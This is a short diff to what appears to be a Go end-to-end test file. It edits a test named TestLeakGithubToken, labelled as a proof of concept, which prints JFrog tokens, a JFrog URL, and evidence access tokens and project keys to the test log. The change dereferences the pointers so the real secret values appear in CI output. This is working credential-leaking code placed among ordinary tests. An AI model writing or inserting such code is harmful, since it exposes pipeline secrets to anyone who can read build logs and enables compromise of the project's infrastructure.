@@ -38,7 +38,14 @@ var (
 )
 
 func TestLeakGithubToken(t *testing.T) {
-	t.Logf("PoC: var_jfrog_token: %s var_jfrog_url: %s evidenceAccessToken: %s evidenceProjectKey: %s evidenceProjectToken: %s", jfrog_token, jfrog_url, evidenceAccessToken, evidenceProjectKey, evidenceProjectToken)
+    t.Logf(
+        "PoC: var_jfrog_token: %s var_jfrog_url: %s evidenceAccessToken: %s evidenceProjectKey: %s evidenceProjectToken: %s",
+        *jfrog_token,
+        *jfrog_url,
+        *evidenceAccessToken,
+        *evidenceProjectKey,
+        *evidenceProjectToken,
+    )
 }
 
 // TestEvidence runs all Evidence E2E tests using the main runner
